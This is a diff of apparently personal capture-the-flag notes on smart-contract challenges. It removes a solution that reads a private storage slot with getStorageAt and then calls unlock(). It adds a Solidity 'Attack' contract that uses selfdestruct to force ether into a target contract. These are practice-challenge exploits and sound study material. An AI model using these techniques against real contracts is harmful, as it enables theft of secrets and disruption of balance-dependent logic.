@@ -1,7 +1,23 @@
-## Vault
+## Description
+While doing level 9, I saw how to do this one
 ```
-await web3.eth.getStorageAt('0xEdEf828E0895925BE5DbDB64dBED02aa6EFed5c0',1)
-```
-```
-await contract.unlock()
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IForce {
+    
+}
+
+contract Attack {
+    IForce force;
+
+    constructor(IForce _force) {
+        force = IForce(_force);
+    }
+
+    function attack() public payable {
+        address payable addr = payable(address(force));
+        selfdestruct(addr);
+    }
+}
 ```
